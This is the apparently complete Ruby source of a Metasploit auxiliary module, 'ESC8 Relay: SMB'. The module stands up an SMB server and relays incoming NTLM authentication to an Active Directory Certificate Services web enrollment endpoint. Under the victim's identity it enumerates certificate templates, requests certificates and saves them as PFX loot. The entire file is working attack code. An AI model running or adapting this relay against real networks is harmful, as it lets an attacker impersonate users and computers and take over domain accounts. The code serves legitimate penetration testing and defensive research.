##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::RelayServer

  def initialize
    super({
      'Name' => 'ESC8 Relay: SMB',
      'Description' => %q{
        This module creates an SMB server and then relays the credentials passed to it
        to an HTTP server to gain an authenticated connection.  Once that connection is
        established, the module makes an authenticated request for a certificate based
        on a given template.
      },
      'Author' => [
        'bwatters-r7',
        'jhicks-r7' # query for available certs
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        OptEnum.new('MODE', [ true, 'The issue mode.', 'AUTO', %w[ALL AUTO QUERY_ONLY SPECIFIC_TEMPLATE]]),
        OptString.new('CERT_TEMPLATE', [ false, 'The template to issue if MODE is SPECIFIC_TEMPLATE.' ], conditions: %w[MODE == SPECIFIC_TEMPLATE]),
        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
      ]
    )

    deregister_options(
      'RPORT', 'RHOSTS', 'SMBPass', 'SMBUser', 'CommandShellCleanupCommand', 'AutoVerifySession'
    )
  end

  def relay_targets
    Msf::Exploit::Remote::SMB::Relay::TargetList.new(
      :http,
      80,
      datastore['RELAY_TARGETS'],
      '/certsrv/', # TODO: this needs to be pulled from the datastore
      randomize_targets: datastore['RANDOMIZE_TARGETS']
    )
  end

  def run
    if datastore['RHOSTS'].present?
      print_warning('Warning: RHOSTS datastore value has been set which is not supported by this module. Please verify RELAY_TARGETS is set correctly.')
    end

    @issued_certs = {}
    start_service
    print_status('Server started.')

    # Wait on the service to stop
    service.wait if service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    case datastore['MODE']
    when 'AUTO'
      cert_template = relay_identity.end_with?('$') ? 'Computer' : 'User'
      retrieve_cert(relay_connection, relay_identity, cert_template)
    when 'ALL', 'QUERY_ONLY'
      cert_templates = get_cert_templates(relay_connection)
      unless cert_templates.nil? || cert_templates.empty?
        print_status("Available Certificates for #{relay_identity} on #{datastore['RELAY_TARGET']}: #{cert_templates.join(', ')}")
        if datastore['MODE'] == 'ALL'
          retrieve_certs(relay_connection, relay_identity, cert_templates)
        end
      end
    when 'SPECIFIC_TEMPLATE'
      cert_template = datastore['CERT_TEMPLATE']
      retrieve_cert(relay_connection, relay_identity, cert_template)
    end
    vprint_status('Relay tasks complete; waiting for next login attempt.')
  end

  def create_csr(private_key, cert_template)
    vprint_status('Generating CSR...')
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
      ['CN', cert_template, OpenSSL::ASN1::UTF8STRING]
    ])
    request.public_key = private_key.public_key
    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
    vprint_status('CSR Generated')
    request
  end

  def get_cert_templates(relay_connection)
    print_status('Retrieving available template list, this may take a few minutes')
    req = relay_connection.request_raw(
      {
        'method' => 'GET',
        'uri' => normalize_uri(datastore['CERT_URI'], 'certrqxt.asp')
      }
    )
    res = relay_connection.send_recv(req, relay_connection.timeout, true)
    return nil unless res&.code == 200

    cert_templates = res.body.scan(/^.*Option Value="[E|O];(.*?);/).map(&:first)
    print_bad('Found no available certificate templates') if cert_templates.empty?
    cert_templates
  end

  def add_cert_entry(relay_identity, cert_template)
    if @issued_certs.key?(relay_identity)
      @issued_certs[relay_identity] << cert_template
    else
      @issued_certs[relay_identity] = [ cert_template ]
    end
  end

  def retrieve_certs(relay_connection, relay_identity, cert_templates)
    cert_templates.each do |cert_template|
      retrieve_cert(relay_connection, relay_identity, cert_template)
    end
  end

  def cert_issued?(relay_identity, cert_template)
    !!@issued_certs[relay_identity]&.include?(cert_template)
  end

  def retrieve_cert(relay_connection, relay_identity, cert_template)
    if cert_issued?(relay_identity, cert_template)
      print_status("Certificate already created for #{relay_identity} using #{cert_template}, skipping...")
      return nil
    end

    vprint_status("Creating certificate request for #{relay_identity} using the #{cert_template} template")
    private_key = OpenSSL::PKey::RSA.new(4096)
    request = create_csr(private_key, cert_template)
    cert_template_string = "CertificateTemplate:#{cert_template}"
    vprint_status('Requesting relay target generate certificate...')
    req = relay_connection.request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(datastore['CERT_URI'], 'certfnsh.asp'),
        'ctype' => 'application/x-www-form-urlencoded',
        'vars_post' => {
          'Mode' => 'newreq',
          'CertRequest' => request.to_s,
          'CertAttrib' => cert_template_string,
          'TargetStoreFlags' => 0,
          'SaveCert' => 'yes',
          'ThumbPrint' => ''
        }
      }
    )
    res = relay_connection.send_recv(req, relay_connection.timeout, true)
    if res&.code == 200 && !res.body.include?('request was denied')
      print_good("Certificate generated using template #{cert_template} and #{relay_identity}")
      add_cert_entry(relay_identity, cert_template)
    else
      print_bad("Certificate request denied using template #{cert_template} and #{relay_identity}")
      return nil
    end

    location_tag = res.body.match(/^.*location="(.*)"/)[1]
    location_uri = normalize_uri(datastore['CERT_URI'], location_tag)
    vprint_status("Attempting to download the certificate from #{location_uri}")
    req = relay_connection.request_cgi(
      {
        'method' => 'GET',
        'uri' => location_uri
      }
    )
    res = relay_connection.send_recv(req, relay_connection.timeout, true)
    info = "#{relay_identity} Certificate"
    certificate = OpenSSL::X509::Certificate.new(res.body)
    pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
    stored_path = store_loot('windows.ad.cs',
                             'application/x-pkcs12',
                             relay_connection.target.ip,
                             pkcs12.to_der,
                             'certificate.pfx',
                             info)
    print_good("Certificate for #{relay_identity} using template #{cert_template} saved to #{stored_path}")
    certificate
  end

  def normalize_uri(*strs)
    new_str = strs * '/'

    new_str = new_str.gsub!('//', '/') while new_str.index('//')

    # Makes sure there's a starting slash
    unless new_str[0, 1] == '/'
      new_str = '/' + new_str
    end

    new_str
  end
end
